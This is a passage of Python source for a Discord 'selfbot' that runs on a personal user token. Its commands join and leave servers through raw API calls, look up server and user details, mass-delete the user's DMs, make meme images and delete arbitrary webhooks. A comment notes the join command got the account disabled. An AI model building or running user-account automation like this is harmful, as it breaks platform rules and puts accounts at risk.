        embed=discord.Embed(title=f"Scalic Selfbot - Server joiner", description=f"Joining server : `discord.gg/{link}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)
        joint = requests.post(f"https://discord.com/api/v6/invites/{link}", headers=headers).status_code
        randcolor = random.randint(0x000000, 0xFFFFFF)
        if joint == 200:
        
        
            embed=discord.Embed(title=f"Scalic Selfbot - Server joiner", description=f"Successfully joined : `discord.gg/{link}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            

        else:
            embed=discord.Embed(title=f"Scalic Selfbot - Server joiner", description=f"Error Joining : `discord.gg/{link}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await message.edit(embed=embed)

#join server command got my account disabled - need to look into it
@scalic.command(aliases=['lserver',"leaveserver","serverleave"])
async def leave(ctx,servid=None):#
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if servid == None:
            embed=discord.Embed(title=f"Scalic Selfbot - Server joiner", description=f"Supply a link - {prefix.strip()}leave [server-id] \n(fyi this server id is {ctx.guild.id})", color=randcolor) #yes - i could make it do it in the guild its done it but idk, feel like people might accidently not supply a userid or sum
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.send(embed=embed)
    else:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}

        embed=discord.Embed(title=f"Scalic Selfbot - Server Leaver", description=f"Leaving `{servid}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)
        leave = requests.delete(f"https://discord.com/api/v8/users/@me/guilds/{servid}", headers=headers)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        if leave.status_code == 204:
        
            embed=discord.Embed(title=f"Scalic Selfbot - Server Leaver", description=f"Success | Left Server : `{servid}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await message.edit(embed=embed)


        else:
            embed=discord.Embed(title=f"Scalic Selfbot - Server Leaver", description=f"Error | Error leaving server : `{servid}`\nMessage : {leave.text}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await message.edit(embed=embed)


@scalic.command(aliases=["serverinformation","infoserver"])
async def serverinfo(ctx):
    await ctx.message.delete()

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Scalic Selfbot - Gathering info on {ctx.guild.name}", description="...", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    message = await ctx.send(embed=embed)
    await asyncio.sleep(1)
    try:
        boostlevel = ctx.guild.premium_tier
    except:
        boostlevel = "Error"
    try:
        boostcount = ctx.guild.premium_subscription_count
    except:
        boostcount = "Error"
    try:

        roles = len(ctx.guild.roles)
    except:
        roles = "Error"
    
    try:
        cate = len(ctx.guild.categories)
    except:
        cate = "Error"
    
    try:
        chanel = len(ctx.guild.channels)
    except:
        chanel = "Error"
    try:

        textchans = len(ctx.guild.text_channels)
    except:
        textchans = "Error"

    try:
        vcchans = len(ctx.guild.voice_channels)
    except:
        vcchans = "Error"
    try:

        users = ctx.guild.member_count
    except:
        users = "Error"

    try:
        onlineusers = sum(member.status==discord.Status.online and not member.bot for member in ctx.guild.members)
    except:
        onlineusers = "Error"
    try:
        offlineusers = sum(member.status==discord.Status.offline and not member.bot for member in ctx.guild.members)
    except:
        offlineusers = "Error"
    try:
   
        humans = sum(not member.bot for member in ctx.guild.members)
    except:
        humans = "Error"

    try:
  
        bots = sum(member.bot for member in ctx.guild.members)
    except:
        bots = "Error"
    
    info = f"""
`Boost Count` ```{boostcount}```

`Server Boost Level` ```{boostlevel}```

`Role Count` ```{roles}```

`Category Count` ```{cate}```

`Total Channel Count` ```{chanel}```

`Text Channel Count` ```{textchans}```

`Voice Channel Count` ```{vcchans}```

`Total Member Count` ```{users}```


"""

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Scalic Selfbot - {ctx.guild.name}", description=info, color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await message.edit(embed=embed)

    
@scalic.command(aliases=["whois","infouser"])
async def userinfo(ctx, member: discord.Member = None):
    await ctx.message.delete()
    if not member:  
        member = ctx.message.author 

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - User info", description=f"Getting user info on {member.name}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    message = await ctx.send(embed=embed)
    await asyncio.sleep(2)

    roles = [role for role in member.roles]


    value = ""
    try:
        for role in roles:
            if role.name != "@everyone":
                value = value + f"{role.name}\n"

    except:
        value = "Error"


    try:
        highestrole = member.top_role.name
    except:
        highestrole = "Error"

    
    if len(roles) == 1:
        value = "None"
        highestrole = "None"
    if ctx.guild != None:
        info = f"""
    `User ID` ```{member.id}```

    `Display Name` ```{member.display_name}```

    `Account Made On` ```{member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")}```

    `Joined [{ctx.guild.name}] On` ```{member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")}```

    `Roles` ```{value}```

    `Highest Role` ```{highestrole}```




    """  
    else:
        info = f"""
`User ID` ```{member.id}```

`Display Name` ```{member.display_name}```

`Account Made On` ```{member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC")}```


"""  
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title=f"Scalic Selfbot - {member.name}#{member.discriminator}", description=info, color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await message.edit(embed=embed)


@scalic.command(aliases=['cleardms','dmsclear',])
async def dmclear(ctx):
    usersdone = 0
    totalmessage = 0
    await ctx.message.delete()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message Clearer", description=f"Clearing all messages with all users", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    msg= await ctx.send(embed=embed)
    for channel in scalic.private_channels:
        if isinstance(channel, discord.DMChannel):
            async for message in channel.history(limit=9999):
                try:
                    if message.author == scalic.user:
                        if message != msg:
                            await message.delete()
                            totalmessage = totalmessage + 1
                except:
                    pass

        usersdone = usersdone + 1
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - Message Clearer", description=f"Clearing all messages with all users\nUsers Done : {usersdone}\nTotal Messages Deleted : {totalmessage}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await msg.edit(embed=embed)  #like said before - i could get a smoother "live" update count but it slows the bot down so much


    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message Clearer", description=f"Clearing all messages with all users\nTask completed - Cleared messages with {usersdone} Users\nTotal Messages Deleted : {totalmessage}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await msg.edit(embed=embed,delete_after=15)

@scalic.command()
async def joke(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    joke = requests.get("https://sv443.net/jokeapi/v2/joke/Pun?blacklistFlags=nsfw,racist,sexist&type=twopart").text
    j = json.loads(joke)
    setup = j['setup']
    delivery = j['delivery']

    embed=discord.Embed(title="Scalic Selfbot - Joke requested", description=f"{setup}\n||{delivery}||", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['stickbugged'])
async def stickbug(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    await ctx.message.edit(content="_this command takes a while, please be patient_")
    stikcbug = requests.get(f"https://nekobot.xyz/api/imagegen?type=stickbug&url={finalurl}").text
    j = json.loads(stikcbug)
    stickbugvid = j['message']
    await ctx.message.edit(content=stickbugvid)


@scalic.command(aliases=['urbandictionary',"dictionary"])
async def ud(ctx,*,wordtodefine=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if wordtodefine == None:  
        embed=discord.Embed(title="Scalic Selfbot - Urban Dictionary Command", description=f"You didn't supply a word to define?", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        defineword = wordtodefine.replace(" ","%20")
        data = requests.get(f"https://api.urbandictionary.com/v0/define?term={defineword}")
        
        try:
            j = json.loads(data.text)
            ud_def = j['list']
            ud_def = str(ud_def)
            ud_data_yes = ud_def.split("', 'permalink'") 

            ud_data_yes = ud_data_yes[0].split(": '") 

            finaldef = ud_data_yes[1].replace("[","").replace("]","").replace("\\n","\n").replace("\\r","")
            #was losing my mind, I'll of learnt about json since but I was tryna make this and no one i knew knew how to help so yeah :)

            embed=discord.Embed(title="Scalic Selfbot - Urban Dictionary Command", description=f"Definition of `{wordtodefine}`\n{finaldef}\n\n", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed)
        except:
            embed=discord.Embed(title="Scalic Selfbot - Urban Dictionary Command", description=f"Error when searching for the term : `{wordtodefine}`", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(content="",embed=embed)           

@scalic.command(aliases=['deepfri'])
async def deepfry(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=deepfry&image={finalurl}").text
    j = json.loads(data)
    deepfri = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=deepfri)
    await ctx.message.edit(content="",embed=embed)

@scalic.command()
async def blurpify(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=blurpify&image={finalurl}").text
    j = json.loads(data)
    blurple = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=blurple)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['magicify',"magikify"])
async def magic(ctx,  memb : discord.Member=None,intense="5"):
    if memb == None:  
        memb = ctx.message.author 

    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    finalurl = finalurl.replace("webp","png")
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=magik&image={finalurl}&intensity={intense}").text
    j = json.loads(data)
    magicwoah = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=magicwoah)
    await ctx.message.edit(content="",embed=embed)


    
@scalic.command(aliases=['cylde'])
async def clyde(ctx,*, message=f"Maybe supply a message next time | {prefix.strip()}clyde [message-here]"):

    cylde = requests.get(f"https://nekobot.xyz/api/imagegen?type=clyde&text={message}").text
    j = json.loads(cylde)
    clydeimg = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=clydeimg)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['jealous',"distracted"])
async def ship(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=ship&user1={memb.avatar_url}&user2={ctx.message.author.avatar_url}").text
    j = json.loads(data)
    ship = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=ship)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['whowouldwin'])
async def www(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=whowouldwin&user1={ctx.message.author.avatar_url}&user2={memb.avatar_url}").text
    j = json.loads(data)
    ship = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=ship)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['catcha',"capture"]) #for those who cant spell
async def captcha(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=captcha&url={memb.avatar_url}&username={memb.name}").text
    j = json.loads(data)
    captcha = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=captcha)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['threats'])
async def threat(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 
    finalurl = str(memb.avatar_url)
    finalurl = finalurl.replace("gif","png")
    threatdata = requests.get(f"https://nekobot.xyz/api/imagegen?type=threats&url={finalurl}").text
    j = json.loads(threatdata)
    threatmeme = j['message']
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=threatmeme)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["twitter","twittertweet"])
async def tweet(ctx, member: discord.Member,*,tweetmessage=f"Format : {prefix.strip()}tweet [member] [message]"):
    tweeter = requests.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={member.name}&&text={tweetmessage}").text
    j = json.loads(tweeter)
    finalimage = j['message']

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=finalimage)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["cmm","changemind"])
async def changemymind(ctx,*,changemymindtext=None):
    if changemymindtext == None:
        changemymindtext = f"{ctx.message.author.name} should supply a message after doing {prefix.strip()}changemymind"
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=changemymind&text={changemymindtext}").text
    j = json.loads(data)
    changemymindimage = j['message']

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=changemymindimage)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["kanagen"])
async def kannagen(ctx,*,kannatext=None):
    if kannatext == None:
        kannatext = f"{ctx.message.author.name} the format is {prefix.strip()}kannagen [message]"
    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=kannagen&text={kannatext}").text
    j = json.loads(data)
    kannaimg = j['message']

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=kannaimg)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["iphoneex","phone","iphone"])
async def iphonex(ctx,  memb : discord.Member=None):
    if memb == None:  
        memb = ctx.message.author 

    data = requests.get(f"https://nekobot.xyz/api/imagegen?type=iphonex&url={memb.avatar_url}").text
    j = json.loads(data)
    phonephoto = j['message']

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=phonephoto)
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=["scalicselfbot","scalic","link","website"])
async def download(ctx):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url="https://i.imgur.com/Ne7zrIr.png")
    await ctx.message.edit(content="https://github.com/scalic Scalic selfbot - Scalic selfbot was made as a fun project.\nScalic is free and has creative commands - why wouldn't you try it out\nIt has a wide range of commands, uses fun apis and is simple to setup - no api keys needed",embed=embed)  

@scalic.command(aliases=["gender"])
async def name(ctx,*,namesupplied=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if namesupplied == None:
        embed=discord.Embed(title="Scalic Selfbot - Gender command", description=f"You didn't supply a name\n{prefix.strip()}name [name]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        data = requests.get(f"https://api.genderize.io/?name={namesupplied}").text
        j = json.loads(data)
        gen = j['gender']
        likely = j['probability']
        
        embed=discord.Embed(title="Scalic Selfbot - Gender command", description=f"Majority of people named {namesupplied} are {gen}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['qrcode'])
async def qr(ctx,*,msgg="This user didn't supply a message lel"):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    msgg = msgg.replace(" ","%20")
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(color=randcolor)
    embed.set_image(url=f"https://api.qrserver.com/v1/create-qr-code/?size=150x150&data={msgg}")
    await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=['deletewebhook'])
async def webhookdelete(ctx,link=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    if link == None:
        embed=discord.Embed(title="Scalic Selfbot - No webhook supplied", description=f"{prefix.strip()}webhookdelete [webhook]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)
    else:
        embed=discord.Embed(title="Scalic Selfbot - Deleting webhook", description=f"Sending a delete request to\n{link}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)


        result = requests.delete(link)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        if result.status_code == 204:
            embed=discord.Embed(title="Scalic Selfbot - Webhook Deleted", description=f"Yay", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(embed=embed)
        else:
            embed=discord.Embed(title="Scalic Selfbot - Error Deleting Webhook", description=f"Delete request responded with status code : {result.status_code}\{result.text}", color=randcolor)
            embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
            embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
            await ctx.message.edit(embed=embed)

scalic.run(token.strip(), bot=False)
